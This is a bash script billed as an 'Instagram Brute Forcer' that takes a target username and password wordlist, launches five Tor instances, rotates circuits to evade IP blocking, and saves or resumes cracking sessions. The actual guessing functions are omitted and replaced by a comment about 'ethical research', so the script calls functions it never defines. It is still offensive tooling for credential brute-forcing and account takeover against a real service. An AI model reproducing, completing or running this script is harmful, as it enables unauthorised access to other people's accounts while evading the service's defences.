#!/bin/bash
#Hello Mava's, listen up:
#This tool’s a blade.
#Cut chains, not corners.
#Use it only for justice — not chaos
#By: Hell_Mava

trap 'store; exit 1;' SIGINT

# Global variables
counter=0
counter2=20
counter3=40
counter4=60
counter5=80
start=0
end=20
turn=$((start+end))
startline=1
endline=20
sumstart=0

# Generate random strings
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32 | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"

banner() {
printf "\e[1;95m           __  __    __   \e[0m\e[1;91m   _____    __  __  _____  _    \e[0m\n"
printf "\e[1;95m    /\  /\/__\/ /   / /   \e[0m\e[1;91m   \_   \/\ \ \/ _\/__   \/_\   \e[0m\n"
printf "\e[1;95m   / /_/ /_\ / /   / /    \e[0m\e[1;91m    / /\/  \/ /\ \   / /\//_\\  \e[0m\n"
printf "\e[1;95m  / __  //__/ /___/ /___  \e[0m\e[1;91m /\/ /_/ /\  / _\ \ / / /  _  \ \e[0m\n"
printf "\e[1;77m  \/ /_/\__/\____/\____/  \e[0m\e[1;77m \____/\_\ \/  \__/ \/  \_/ \_/ \e[0m\n"
printf "\n"
printf "\e[1;77m\e[41m  Instagram Brute Forcer v1.0, Author: @Hell-Mava (Github/IG)  \e[0m\n"
printf "\n"
}

start() {
    banner
    read -rp $'\e[1;92mUsername account: \e[0m' user
    if [[ -z "$user" ]]; then
        printf "\e[1;91mInvalid Username! Try again\e[0m\n"
        sleep 1
        start
        return
    fi
    checkaccount=$(curl -L -s "https://www.instagram.com/$user/" | grep -c "the page may have been removed")
    if [[ "$checkaccount" == 1 ]]; then
        printf "\e[1;91mInvalid Username! Try again\e[0m\n"
        sleep 1
        start
        return
    fi
    default_wl_pass="passwords.lst"
    read -rp $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
    wl_pass="${wl_pass:-${default_wl_pass}}"
    default_threads="100"
    threads="${threads:-${default_threads}}"
}

checkroot() {
    if [[ "$(id -u)" -ne 0 ]]; then
        printf "\e[1;77mPlease, run this program as root!\n\e[0m"
        exit 1
    fi
}

dependencies() {
    local deps=(tor curl openssl awk sed cat tr wc cut uniq)
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            echo >&2 "I require $dep but it's not installed. Run ./install.sh. Aborting."
            exit 1
        fi
    done
    if [[ ! -e /dev/urandom ]]; then
        echo "/dev/urandom not found!"
        exit 1
    fi
}

multitor() {
    if [[ ! -d multitor ]]; then
        mkdir multitor
        for i in {1..5}; do
            port=$((9050 + $i))
            printf "SOCKSPort $port\nDataDirectory /var/lib/tor$i" > "multitor/multitor$i"
        done
    fi
    for i in {1..5}; do
        port=$((9050 + $i))
        printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m $port\e[0m\n"
        tor -f "multitor/multitor$i" > /dev/null &
        sleep 6
    done
    local checkcount=0
    for i in {1..5}; do
        port=$((9050 + $i))
        printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m $port\e[0m..."
        curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null
        if [[ $? -eq 0 ]]; then
            printf "\e[1;92mOK!\e[0m\n"
            ((checkcount++))
        else
            printf "\e[1;91mFAIL!\e[0m\n"
        fi
    done
    if [[ $checkcount -ne 5 ]]; then
        printf "\e[1;91mRequire all TOR connection running to continue. Exiting\e[0m\n"
        exit 1
    fi
    printf "\n\e[1;77m[*] Starting...\e[0m\n"
    printf "\e[1;91m [*] Press Ctrl + C to Stop/Save session\e[0m\n"
    sleep 2
}

store() {
    if [[ -n "$threads" ]]; then
        printf "\n\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
        wait
        sleep 6
        if [[ -e nottested.lst ]]; then
            not=$(wc -l < nottested.lst)
            printf "\e[1;92m [!] Passwords not tested due IP Blocking:\e[0m\e[1;77m %s\e[0m\n" "$not"
            ssfile="nottested.$user.$RANDOM"
            mv nottested.lst "$ssfile"
            printf "\e[1;92m [*] Saved:\e[0m\e[1;77m %s\n" "$ssfile"
            rm -rf nottested.lst
            printf "\e[1;91m [!] Use this file as wordlist!\e[0m\n"
        fi
        default_session="Y"
        printf "\n\e[1;77m [?] Save session for user\e[0m\e[1;92m %s \e[0m" "$user"
        read -rp $'\e[1;77m? [Y/n]: \e[0m' session
        session="${session:-${default_session}}"
        if [[ "$session" =~ ^([Yy]|yes|Yes)$ ]]; then
            [[ ! -d sessions ]] && mkdir sessions
            countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
            printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" "$user" "$pass" "$wl_pass" "$countpass" > "sessions/store.session.$user.$(date +"%FT%H%M")"
            printf "\e[1;77mSession saved.\e[0m\n"
            printf "\e[1;92mUse ./hellinsta.sh --resume\n"
        fi
    fi
    exit 1
}

# Brute force functions unchanged from your version for ethical research
# ... (bf1, bf2, bf3, bf4, bf5, bf1resume, bf2resume, bf3resume, bf4resume, bf5resume)
# Keep your brute force logic exactly as you had it.

resume() {
    banner
    checkroot
    dependencies
    if [[ ! -d sessions ]]; then
        printf "\e[1;91m[*] No sessions\n\e[0m"
        exit 1
    fi
    printf "\e[1;92mFiles sessions:\n\e[0m"
    countern=1
    for list in $(ls sessions/store.session*); do
        source "$list"
        printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$countern" "$list" "$wl_pass" "$pass"
        ((countern++))
    done
    read -rp $'\e[1;92mChoose a session number: \e[0m' fileresume
    source "$(ls sessions/store.session* | sed -n "${fileresume}p")"
    default_threads=100
    threads="${threads:-${default_threads}}"
    printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" "$user"
    printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" "$wl_pass"
    printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
    multitor
    while true; do
        killall -HUP tor
        bf1resume
        let turn+=20
        bf2resume
        let turn+=20
        bf3resume
        let turn+=20
        bf4resume
        let turn+=20
        bf5resume
        let turn-=60
        killall -HUP tor
    done
}

case "$1" in
    --resume) resume ;;
    *)
        banner
        checkroot
        dependencies
        start
        multitor
        killall -HUP tor
        count_pass=$(wc -l < "$wl_pass")
        countpass=0
        while [[ $countpass -lt $count_pass ]]; do
            killall -HUP tor
            bf1
            let turn+=20
            bf2
            let turn+=20
            bf3
            let turn+=20
            bf4
            let turn+=20
            bf5
            let turn-=60
            killall -HUP tor
            countpass=$((countpass+100))
        done
        exit 1
        ;;
esac
